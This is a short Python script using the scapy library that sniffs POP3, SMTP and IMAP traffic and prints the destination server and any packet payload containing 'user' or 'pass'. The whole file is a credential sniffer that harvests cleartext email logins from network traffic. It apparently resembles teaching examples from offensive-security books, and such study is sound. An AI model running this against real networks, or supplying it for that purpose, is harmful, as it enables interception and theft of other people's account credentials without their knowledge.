#!/usr/bin/python

from scapy import *
def packet_callpack(packet):
    
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload
            
# fire up Sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callpack,store=0)
